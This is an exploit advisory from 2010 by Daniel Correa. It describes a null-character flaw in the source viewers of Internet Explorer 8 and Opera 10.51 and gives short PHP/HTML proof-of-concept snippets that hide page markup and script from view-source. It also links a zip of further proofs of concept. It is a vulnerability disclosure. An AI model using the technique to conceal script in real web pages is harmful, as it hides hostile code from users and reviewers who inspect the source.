@@ -1,0 +1,67 @@
+# Exploit Title: IE/Opera source code viewer Null Character Handling
+Vulnerability
+# Date: 10/04/2010
+# Author: Daniel Correa
+# Software Link:
+http://www.microsoft.com/windows/internet-explorer/default.aspx
+# Software Link: http://www.opera.com/download/
+# Version: Tested on IE 8, Opera 10.51
+# Tested on: Windows XP; Windows 7 + default IE 8
+# CVE :
+
+# Description :
+The vulnerability in the source code viewer in both browsers (IE &
+Opera) is when they are processing the null control character (0×00),
+including this character in the transmission message results in a
+misunderstanding that is reflected in the concealment of the transmitted
+message, only the code that is between valid tags is shown. In other
+words, exploiting this vulnerability we can completely hide the source
+code to the user of Internet Explorer and Opera browsers.
+
+# Code:
+The next code hide all the source code to source code viewer.
+<?php
+echo "\x00";
+?>
+Esto es un mensaje oculto
+This is a hide message
+Este es otro
+Thie is another one
+...
+Como vemos podemos esconder cualquier mensaje
+As we can see we can hide any message
+<html>
+<head>
+<title>Titulo</title>
+</head>
+<body>
+<h1>Hola mundo</h1>
+</body>
+</html>
+
+And the next,only hide part of the code (The script part)
+<html>
+<head>
+<title>Titulo</title>
+</head>
+<body>
+<h1>Hello world</h1>
+</body>
+</html>
+<?php
+echo chr(0);
+?>
+<script>alert('This code is never seen');</script>
+
+
+
+Package contain three proofs of concept:
+http://www.sinfocol.org/archivos/2010/04/ie_opera_null.zip
+
+-- 
+Sinfocol
+http://www.sinfocol.org
+
+La información contenida en este mensaje es confidencial y puede ser legalmente privilegiada. Está destinado únicamente para el destinatario. El acceso a este correo electrónico por cualquier otra persona no está autorizado. Si usted no es el destinatario, cualquier revelación, copia, distribución o cualquier acción u omitido que se adopten en la confianza en él, está prohibida y puede ser ilegal.
+
+The information in this email is confidential and may be legally privileged. It is intended solely for the addressee. Access to this email by anyone else is unauthorized. If you are not the intended recipient, any disclosure, copying, distribution or any action taken or omitted to be taken in reliance on it, is prohibited and may be unlawful.
